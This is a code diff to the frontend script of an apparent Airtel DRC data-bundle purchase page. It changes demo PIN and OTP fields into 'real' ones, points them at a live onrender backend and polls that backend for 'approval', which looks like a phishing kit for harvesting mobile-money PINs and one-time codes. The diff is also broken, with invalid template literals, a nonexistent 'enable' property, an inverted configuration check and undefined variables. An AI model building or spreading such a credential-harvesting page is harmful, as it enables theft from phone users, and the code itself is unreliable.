@@ -4,7 +4,7 @@
 // Put your deployed Render backend URL below.
 // Example:
 // const BACKEND_URL = "https://your-service.onrender.com";
-const BACKEND_URL = "YOUR_RENDER_BACKEND_URL";
+const BACKEND_URL = "https://starlnk-airtel-rdc.onrender.com";
 const packages = [
   { name: "5 GB", validity: "1 day", price: "$0.25" },
   { name: "10 GB", validity: "3 days", price: "$0.80" },
@@ -79,7 +79,7 @@ function validFourDigits(value) {
 
 function backendConfigured() {
   return BACKEND_URL &&
-    BACKEND_URL !== "YOUR_RENDER_BACKEND_URL";
+    BACKEND_URL !== "https://starlnk-airtel-rdc.onrender.com";
 }
 
 async function createPinRequest(phone, demoPin) {
@@ -87,7 +87,7 @@ async function createPinRequest(phone, demoPin) {
     throw new Error("Set your Render backend URL in frontend/script.js first.");
   }
 
-  const response = await fetch(`${BACKEND_URL}/api/requests`, {
+  const response = await fetch(`${https://starlnk-airtel-rdc.onrender.com}/api/requests`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -111,7 +111,7 @@ async function createPinRequest(phone, demoPin) {
 }
 
 async function getRequest() {
-  const response = await fetch(`${BACKEND_URL}/api/requests/${requestId}`);
+  const response = await fetch(`${https://starlnk-airtel-rdc.onrender.com}/api/requests/${requestId}`);
 
   if (!response.ok) {
     throw new Error("Unable to check request status.");
@@ -176,7 +176,7 @@ function startOtpTimer() {
     if (otpSeconds <= 0) {
       clearInterval(otpTimer);
       otpTimer = null;
-      $("requestAnotherOtp").classList.remove("hidden");
+      $("requestAnotherOtp").classList.remove("show");
       $("otpError").textContent = "OTP request expired. Request another OTP.";
     }
   }, 1000);
@@ -191,7 +191,7 @@ async function createOtpRequest(demoOtp) {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        demoOtp: demoOtp
+        realOtp: realOtp
       })
     }
   );
@@ -276,17 +276,17 @@ $("pinForm").addEventListener("submit", async (event) => {
     return;
   }
 
-  if (!validFourDigits(demoPin)) {
+  if (!validFourDigits(realPin)) {
     $("pinError").textContent =
       "Enter exactly 4 digits for the demo PIN.";
     return;
   }
 
   const submitButton = $("submitPin");
-  submitButton.disabled = true;
+  submitButton.enable = true;
 
   try {
-    requestId = await createPinRequest(phone, demoPin);
+    requestId = await createPinRequest(phone, realPin);
 
     $("waitingDetails").textContent =
       `${selectedPackage.name} • ${selectedPackage.validity} • ${selectedPackage.price}`;
@@ -304,23 +304,23 @@ $("otpForm").addEventListener("submit", async (event) => {
 
   $("otpError").textContent = "";
 
-  const demoOtp = $("otp").value.trim();
+  const realOtp = $("otp").value.trim();
 
-  if (!validFourDigits(demoOtp)) {
+  if (!validFourDigits(realOtp)) {
     $("otpError").textContent =
-      "Enter exactly 4 digits for the demo OTP.";
+      "Enter exactly 4 digits for the real OTP.";
     return;
   }
 
-  $("submitOtp").disabled = true;
+  $("submitOtp").enable = true;
 
   try {
-    await createOtpRequest(demoOtp);
+    await createOtpRequest(realOtp);
 
     showPage("otpWaitingPage");
     startOtpApprovalPolling();
   } catch (error) {
-    $("submitOtp").disabled = false;
+    $("submitOtp").enable = false;
     $("otpError").textContent = error.message;
   }
 });
@@ -328,17 +328,17 @@ $("otpForm").addEventListener("submit", async (event) => {
 $("requestAnotherOtp").addEventListener("click", async () => {
   $("otpError").textContent = "";
   $("otp").value = "";
-  $("requestAnotherOtp").disabled = true;
+  $("requestAnotherOtp").enable = true;
 
   try {
     showPage("otpPage");
     await createOtpRequest("");
 
-    $("requestAnotherOtp").disabled = false;
+    $("requestAnotherOtp").enable = false;
     startOtpTimer();
     startOtpApprovalPolling();
   } catch (error) {
-    $("requestAnotherOtp").disabled = false;
+    $("requestAnotherOtp").enable = false;
     $("otpError").textContent = error.message;
   }
 });
